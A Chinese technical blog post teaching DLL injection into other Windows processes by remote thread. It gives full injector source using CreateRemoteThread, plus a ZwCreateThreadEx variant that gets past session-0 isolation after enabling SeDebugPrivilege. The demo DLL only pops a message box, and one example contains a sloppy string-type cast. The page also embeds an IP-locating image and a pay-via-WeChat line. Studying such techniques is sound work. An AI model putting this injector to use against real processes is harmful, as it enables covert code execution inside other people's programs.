# 技术分享 | DLL注入之远线程注入

**此文为加密收费内容添加我微信支付后可看:**
<!--more-->
![IP定位](https://tool.lu/netcard/)
# 技术分享 | DLL注入之远线程注入



### 0x00 远线程注入

远线程注入是指一个进程在另一个进程中创建线程的技术。



### 0x01 函数介绍

##### OpenProcess

**作用：** 打开现有的本地进程对象。

**函数声明：**

![点击复制代码](https://www.heibai.org/zb_system/image/admin/page_copy.png)

```
HANDLE WINAPI OpenProcess(
    _In_ DWORD dwDesiredAccess,
    _In_ BOOL  bInheritHandle,
    _In_ DWORD dwProcessId
)
```

**参数：**
dwDesiredAccess：
想拥有该进程的访问权限，若进程启动了SeDebugPrivilege权限，则无论安全描述符内容是什么，都会授予请求的访问权限。

bInheritHandle：
若该值为TRUE，则此进程创建的进程将继承该句柄。

dwProcessId：
本地进程的PID。

**返回值：**
成功：返回进程打开句柄
失败：返回NULL

------

##### VirtualAllocEx

**作用：** 在指定进程的虚拟地址空间内保留、提交或更改内存的状态。

**函数声明：**

![点击复制代码](https://www.heibai.org/zb_system/image/admin/page_copy.png)

```
LPVOID WINAPI VirtualAllocEx(
    _In_     HANDLE hProcess,
    _In_opt_ LPVOID lpAddress,
    _In_     SIZE_T dwSize,
    _In_     DWORD  flAllocationType,
    _In_     DWORD  flProtect
)
```

**参数：**
hProcess:
过程的句柄。句柄必须有PROCESS_VM_OPERATION（允许远程VM操作）权限。

lpAddress：
指定要分配页面所需起始地址指针。若为NULL，则自动分配内存。

dwSize：
要分配的内存大小，单位为字节。

flAllocationType：
内存分配类型。具体参数参考官方手册。

flProtect：
要分配的页面区域的内存保护。

**返回值：**
成功：返回分配页面基址
失败：返回NULL

------

##### WriteProcessMemory

**作用：** 在指定的进程中将数据写入内存区域，要写入的整个区域必须可访问，否则操作失败。

**函数声明：**

![点击复制代码](https://www.heibai.org/zb_system/image/admin/page_copy.png)

```
BOOL WINAPI WriteProcessMemory(
    _In_  HANDLE  hProcess,
    _In_  LPVOID  lpBaseAddress,
    _In_  LPCVOID lpBuffer,
    _In_  SIZE_T  nSize,
    _Out_ SIZE_T  *lpNumberOfBytesWritten
)
```

**参数：**
hProcess:
要修改的进程内存的句柄。句柄必须具有PROCESS_VM_WRITE和PROCESS_VM_OPERATION访问权限。

lpBaseAddress：
指向指定进程中写入数据的基地址指针。

lpBuffer：
指向缓冲区的指针，其中包含要写入指定进程的地址空间中的数据。

nSize：
要写入指定进程的字节数。

lpNumberOfBytesWritten：
指向变量的指针，该变量接收传输到指定进程的字节数。

**返回值：**
成功：返回不为0
失败：返回0

------

##### CreateRemoteThread

**作用：** 在另一个进程的虚拟地址空间中创建运行的线程。

**函数声明：**

![点击复制代码](https://www.heibai.org/zb_system/image/admin/page_copy.png)

```
HANDLE WINAPI CreateRemoteThread（
    _In_  HANDLE                 hProcess,
    _In_  LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    _In_  SIZE_T                 dwStackSize,
    _In_  LPTHREAD_START_ROUTINE lpStartAddress,
    _In_  LPVOID                 lpParameter,
    _In_  DWORD                  dwCreationFlags,
    _Out_ LPDWORD                lpThreadId
）
```

**参数：**
hProcess:
要创建线程的进程句柄。句柄必须具有PROCESS_CREATE_THREAD、RPOCESS_QUERY_INFORMATION、PROCESS_VM_OPERATION、PROCESS_VM_WRITE和PROCESS_VM_READ访问权限。

lpThreadAttributes:
指向SECURITY_ATTRIBUTES结构的指针，该结构指定新线程的安全描述符，并确定进程是否可以继承返回的句柄。若为NULL，则线程获取默认的安全描述符，不能继承该句柄。

dwStackSize:
堆栈的初始大小，以字节为单位。

lpStartAddress：
指向由线程执行类型为LPTHREAD_START_ROUTINE的应用程序定义的函数指针，并表示远程进程中线程的起始地址，该函数必须存在于远程进程中。

lpParameter：
指向要传递给线程函数的变量的指针。

dwCreationFlags：
控制线程创建的标志。若为0，表示线程在创建后立即运行。

lpThreadId：
指向接收线程标识符的变量的指针。为NULL则不返回线程标识符。

**返回值：**
成功：返回新线程的句柄
失败：返回NULL

### 0x02 实现过程

1、获取LoadLibrary函数的地址，对于kernel32.dll的加载基址在每个进程中都是相同的，所以我们能获取LoadLibrary函数的地址。
2、调用VirtualAllocEx函数向目标进程空间申请一块内存。
3、调用WriteProcessMemory函数将指定的DLL路径写入到目标进程空间。
4、通过CreateRemoteThread函数加载LoadLibrary函数的地址，进行DLL注入。

### 0x03 实例代码

![点击复制代码](https://www.heibai.org/zb_system/image/admin/page_copy.png)

```
#include <Windows.h>
#include <stdio.h>

BOOL CreateRemoteThreadInjectDll(DWORD dwProcessId, wchar_t *pszDllFileName) {
    HANDLE hProcess = NULL;
    DWORD dwSize = 0;
    LPVOID pDllAddr = NULL;
    FARPROC pFuncProcAddr = NULL;

    // 打开注入的进程
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (NULL == hProcess) {
        printf("Error OpenProcess,%d", GetLastError());
        return FALSE;
    }

    // 在注入进程中申请内存
    dwSize = 1 + lstrlen(pszDllFileName);
    pDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
    if (pDllAddr == NULL) {
        printf("Error VirtualAllocEx,%d", GetLastError());
        return FALSE;
    }

    // 向申请的内存中写入数据
    if (FALSE == WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, NULL)) {
        printf("Error WriteProcessMemory,%d", GetLastError());
        return FALSE;
    }

    // 获取LoadLibraryA函数地址
    pFuncProcAddr = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryA");
    if (NULL == pFuncProcAddr) {
        printf("Error GetProcAddress,%d", GetLastError());
        return FALSE;
    }

    // CreateRemoteThreadc创建远程线程，实现dll注入
    HANDLE hRemoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, NULL);
    if (NULL == hRemoteThread) {
        printf("Error CreateRemoteThread,%d", GetLastError());
        return FALSE;
    }

    CloseHandle(hProcess);
    return TRUE;
}

int main() {
    wchar_t* dllPath = (wchar_t*)"D:\\Dll1.dll";
    CreateRemoteThreadInjectDll(9956, dllPath);
    return 0;
}
```



DLL代码：
该DLL项目由vs2019生成，注入后自动弹出消息框

![点击复制代码](https://www.heibai.org/zb_system/image/admin/page_copy.png)

```
// dllmain.cpp : 定义 DLL 应用程序的入口点。
#include "pch.h"

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:{
        MessageBoxA(NULL, "Inject is OK!", "OK", MB_OK);
        break; 
    }
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

![img](https://imgs.heibai.org.cn/zb_users/upload/2021/10/20211013110808163409448852060.png)

### 0x04 突破session0隔离的远线程注入

这里使用到一个函数**ZwCreateThreadEx**，实际上CreateRemoteThread最终是通过调用ZwCreateThreadEx实现远线程创建的，ZwCreateThreadEx更为底层。在内核6.0（Windows VISTA、7、8）之后，由于session隔离机制，在创建进程之后是先挂起进程，检查进程所在的会话层后再决定是否恢复进程。

在CreateRemoteThread函数调用ZwCreateThreadEx函数时，由于ZwCreateThreadEx第七个参数为1，会导致线程创建后一直处于挂起状态，因此我们需要设置ZwCreateThreadEx第七个参数为0。

由于在ntdll.dll中，ZwCreateThreadEx并没有被声明，因此需要使用GetProcAddress导出地址



**函数声明：**
win64下：

![点击复制代码](https://www.heibai.org/zb_system/image/admin/page_copy.png)

```
DWORD WINAPI ZwCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    ULONG CreateThreadFlags,
    SIZE_T ZeroBits,
    SIZE_T StackSize,
    SIZE_T MaximumStackSize,
    LPVOID pUnkown
)
```



win32下:

![点击复制代码](https://www.heibai.org/zb_system/image/admin/page_copy.png)

```
DWORD WINAPI ZwCreateThreadEx(
    PHANDLE ThreadHandle,
    ACCESS_MASK DesiredAccess,
    LPVOID ObjectAttributes,
    HANDLE ProcessHandle,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID lpParameter,
    BOOL CreateSuspended,
    DWORD dwStackSize,
    DWORD dw1,
    DWORD dw2,
    LPVOID pUnkown
)
```



实例代码：

![点击复制代码](https://www.heibai.org/zb_system/image/admin/page_copy.png)

```
#include "Windows.h"
#include <stdio.h>

BOOL ZwCreateThreadExInjectDLL(DWORD dwProcessId, const char* pszDllFileName) {
    HANDLE hProcess = NULL;
    SIZE_T dwSize = 0;
    LPVOID pDllAddr = NULL;
    FARPROC pFuncProcAddr = NULL;
    HANDLE hRemoteThread = NULL;
    DWORD dwStatus = 0;

    // 打开进程
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);
    if (NULL == hProcess) {
        printf("Error OpenProcess:%d", GetLastError());
        return FALSE;
    }

    // 申请内存
    dwSize = 1 + ::lstrlen(pszDllFileName);
    pDllAddr = VirtualAllocEx(hProcess, NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
    if (pDllAddr == NULL){
        printf("Error VirtualAllocEx:%d", GetLastError());
         return FALSE;
    }

    // 写入数据
    if (FALSE == WriteProcessMemory(hProcess, pDllAddr, pszDllFileName, dwSize, NULL)) {
        printf("Error WriteProcessMemory:%d", GetLastError());
        return FALSE;
    }

#ifdef _WIN64
    typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        LPVOID ObjectAttributes,
        HANDLE ProcessHandle,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID lpParameter,
        ULONG CreateThreadFlags,
        SIZE_T ZeroBits,
        SIZE_T StackSize,
        SIZE_T MaximumStackSize,
        LPVOID pUnkown);
#else
    typedef DWORD(WINAPI* typedef_ZwCreateThreadEx)(
        PHANDLE ThreadHandle,
        ACCESS_MASK DesiredAccess,
        LPVOID ObjectAttributes,
        HANDLE ProcessHandle,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID lpParameter,
        BOOL CreateSuspended,
        DWORD dwStackSize,
        DWORD dw1,
        DWORD dw2,
        LPVOID pUnkown);
#endif

    // 加载ntdll.dll
    HMODULE hNtdllDll = LoadLibrary("ntdll.dll");
    if (NULL == hNtdllDll) {
        printf("Error Load 'ntdll.dll':%d", GetLastError());
        return FALSE;
    }

    // 获取LoadLibraryA函数地址
    pFuncProcAddr = GetProcAddress(::GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (NULL == pFuncProcAddr) {
        printf("Error GetProcAddress 'LoadLibraryW':%d", GetLastError());
        return FALSE;
    }

    // 获取ZwCreateThreadEx函数地址
    typedef_ZwCreateThreadEx ZwCreateThreadEx = (typedef_ZwCreateThreadEx)GetProcAddress(hNtdllDll, "ZwCreateThreadEx");
    if (NULL == ZwCreateThreadEx) {
        printf("Error GetProcAddress 'ZwCreateThreadEx':%d", GetLastError());
        return FALSE;
    }

    // 使用ZwCreateThreadEx创建远线程，实现DLL注入
    dwStatus = ZwCreateThreadEx(&hRemoteThread, PROCESS_ALL_ACCESS, NULL, hProcess, (LPTHREAD_START_ROUTINE)pFuncProcAddr, pDllAddr, 0, 0, 0, 0, NULL);
    if (NULL == hRemoteThread) {
        printf("Error Inject DLL:%u", dwStatus);
        return FALSE;
    }
    CloseHandle(hProcess);
    FreeLibrary(hNtdllDll);

    return TRUE;
}

// OpenProcess打开高权限的进程需要提权
BOOL EnbalePrivileges(HANDLE hProcess, const char* pszPrivilegesName)
{
     HANDLE hToken = NULL;
     LUID luidValue = { 0 };
     TOKEN_PRIVILEGES tokenPrivileges = { 0 };
     BOOL bRet = FALSE;
     DWORD dwRet = 0;
     // 打开进程令牌并获取进程令牌句柄
     bRet = ::OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &hToken);
     if (FALSE == bRet)
     {
         printf("OpenProcessToken");
         return FALSE;
     }
     // 获取本地系统的 pszPrivilegesName 特权的LUID值
     bRet = ::LookupPrivilegeValue(NULL, pszPrivilegesName, &luidValue);
     if (FALSE == bRet){
         printf("LookupPrivilegeValue");
         return FALSE;
     }
     // 设置提升权限信息
     tokenPrivileges.PrivilegeCount = 1;
     tokenPrivileges.Privileges[0].Luid = luidValue;
     tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
     // 提升进程令牌访问权限
     bRet = ::AdjustTokenPrivileges(hToken, FALSE, &tokenPrivileges, 0, NULL, NULL);
     if (FALSE == bRet){
         printf("AdjustTokenPrivileges");
         return FALSE;
     }
     else{
         // 根据错误码判断是否特权都设置成功
         dwRet = ::GetLastError();
         if (ERROR_SUCCESS == dwRet){
             printf("SUCCESS!!");
             return TRUE;
         }
         else if (ERROR_NOT_ALL_ASSIGNED == dwRet){
             printf("ERROR_NOT_ALL_ASSIGNED");
             return FALSE;
         }
     }
     return FALSE;
 }


int main() {
    HANDLE hProcess = GetCurrentProcess();
    EnbalePrivileges(hProcess, SE_DEBUG_NAME);

    const char* dllPath = "E:\\Dll1.dll";
    ZwCreateThreadExInjectDLL(2940, dllPath);
    return 0;
}
```



执行结果：
![img](https://imgs.heibai.org.cn/zb_users/upload/2021/10/20211013110726163409444636953.png)

### 0x05 踩坑记录

1、如果注入到x64程序，最好exe、dll都编译成x64
2、注入dll需要与注入进程的字符集相同，vs2019可以在项目属性->高级处选择字符集（被这里坑了好久，普通session层可以注入，session0注入不了，查了好久，最后一个大佬说字符集要相同，后面将dll、exe字符集改成多字符集注入成功了)

{{<music url="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@source/Music/64.mp3" name="" artist="Mr·Yang" cover="https://cdn.jsdelivr.net/gh/ybrc/ybrc.github.io@img/avatar.png" fixed="true" volume="100" loop="all" autoplay="true" preload="auto" >}}

<img src="https://tool.lu/netcard/">
